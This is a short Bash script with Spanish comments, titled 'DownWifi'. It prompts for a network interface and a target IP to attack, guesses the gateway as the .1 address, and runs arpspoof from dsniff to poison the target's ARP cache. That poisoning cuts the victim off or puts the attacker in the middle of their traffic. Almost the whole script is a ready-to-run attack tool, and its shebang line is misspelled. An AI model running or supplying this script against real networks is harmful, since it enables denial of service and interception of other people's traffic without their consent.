#!/bin/bashe

## sirve par que se vea todo de rojo 
#echo -e "\e[0;31m...DownWifi...\e[0;31m"

## este solo mostrar la primera linea de rojo 
echo -e "\e[0;31m...DownWifi...\e[0m"

cat << "EOF"

  \  |  /
   \ | /
-----|-----
   / | \
  /  |  \
............... By Josh
EOF

##Funcion para ctrl_c
function ctrl_c() {
    echo "Saliendo y limpiando..."
    # Realiza aquí cualquier limpieza necesaria
    exit 0
}

# Asigna la función ctrl_c al manejo de la señal SIGINT (generada por Ctrl+C)
trap ctrl_c INT

# Verifica si la herramienta está instalada
comprobar_herramienta() {
  if ! [ -x "$(command -v $1)" ]; then
        echo "Error: $1 no está instalado. Por favor, instala $1 y vuelve a intentarlo." >&2
        exit 1
    fi
}

comprobar_herramienta "dsniff"

read -p "Inserte la interfaz de red que quieres utilizar: " interfaz
read -p "Inserte la IP a atacar: " ip

puerta_de_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

# Ejecutar el comando arpspoof
arpspoof -i "$interfaz" -t "$ip" "$puerta_de_enlace"

